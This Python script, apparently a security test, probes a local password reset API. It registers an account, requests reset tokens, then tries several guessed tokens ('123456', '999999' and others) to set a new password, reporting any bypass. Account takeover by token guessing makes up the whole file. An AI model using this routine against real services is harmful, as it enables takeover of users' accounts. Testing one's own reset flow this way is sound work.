#!/usr/bin/env python3
import requests
import time

BASE_URL = "http://localhost:8080/api"

def analyze_password_reset():
    print("[*] Initializing password reset mechanism analysis")
    
    email = "reset_audit@test.com"
    requests.post(
        f"{BASE_URL}/auth/register",
        json={"email": email, "password": "initial_password"}
    )
    
    print("[*] Generating reset token sequence")
    for i in range(1, 4):
        response = requests.post(
            f"{BASE_URL}/auth/forgot-password",
            json={"email": email}
        )
        if response.status_code == 200:
            print(f"[+] Request {i}: Reset payload dispatched successfully")
        time.sleep(0.2)
    
    print("[*] Executing predictable token brute-force payload")
    
    suspicious_tokens = ["100000", "100001", "123456", "999999"]
    
    for token in suspicious_tokens:
        response = requests.post(
            f"{BASE_URL}/auth/reset-password",
            json={
                "token": token,
                "newPassword": "compromised_password"
            }
        )
        
        if response.status_code == 200:
            print(f"[+] Authorization bypassed with token: {token}")
            break
        else:
            print(f"[-] Token rejected: {token}")

if __name__ == "__main__":
    analyze_password_reset()